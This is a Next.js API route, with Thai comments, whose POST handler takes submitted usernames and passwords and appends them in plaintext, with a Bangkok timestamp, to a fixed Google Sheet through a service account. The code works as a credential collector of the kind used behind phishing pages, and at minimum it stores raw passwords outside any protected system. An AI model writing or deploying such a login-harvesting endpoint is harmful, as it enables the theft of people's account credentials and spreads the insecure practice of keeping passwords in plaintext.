import { NextRequest, NextResponse } from "next/server"

// ตั้งค่า Google Sheets API
const SHEET_ID = "1-NsKFnSosQUzSY3ReFjeoH2nZ2S-1UMDlT-SAWILMSw"
const SHEET_NAME = "Sheet1" // หรือชื่อชีทจริงที่ต้องการบันทึก
const GOOGLE_API_KEY = process.env.GOOGLE_API_KEY // ต้องตั้งค่าใน .env.local
const GOOGLE_SERVICE_ACCOUNT_EMAIL = process.env.GOOGLE_CLIENT_EMAIL
const GOOGLE_SERVICE_ACCOUNT_PRIVATE_KEY = process.env.GOOGLE_PRIVATE_KEY?.replace(/\\n/g, "\n")

import { google } from "googleapis"

async function appendToSheet({ username, password, timestamp }: { username: string; password: string; timestamp: string }) {
  if (!GOOGLE_SERVICE_ACCOUNT_EMAIL || !GOOGLE_SERVICE_ACCOUNT_PRIVATE_KEY) {
    throw new Error("Google Service Account credentials not set")
  }
  // แปลง timestamp เป็นเวลาประเทศไทยและรูปแบบอ่านง่าย
  const date = new Date(timestamp)
  const thTime = date.toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })
  const jwt = new google.auth.JWT(
    GOOGLE_SERVICE_ACCOUNT_EMAIL,
    undefined,
    GOOGLE_SERVICE_ACCOUNT_PRIVATE_KEY,
    ["https://www.googleapis.com/auth/spreadsheets"]
  )
  const sheets = google.sheets({ version: "v4", auth: jwt })
  await sheets.spreadsheets.values.append({
    spreadsheetId: SHEET_ID,
    range: `${SHEET_NAME}!A:C`,
    valueInputOption: "USER_ENTERED",
    requestBody: {
      values: [[username, password, thTime]],
    },
  })
}

export async function POST(req: NextRequest) {
  try {
    const { username, password, timestamp } = await req.json()
    if (!username || !password || !timestamp) {
      return NextResponse.json({ success: false, error: "Missing fields" }, { status: 400 })
    }
    await appendToSheet({ username, password, timestamp })
    return NextResponse.json({ success: true })
  } catch (e: any) {
    console.error("[log-login] error:", e)
    return NextResponse.json({ success: false, error: e.message || "Unknown error" }, { status: 500 })
  }
}
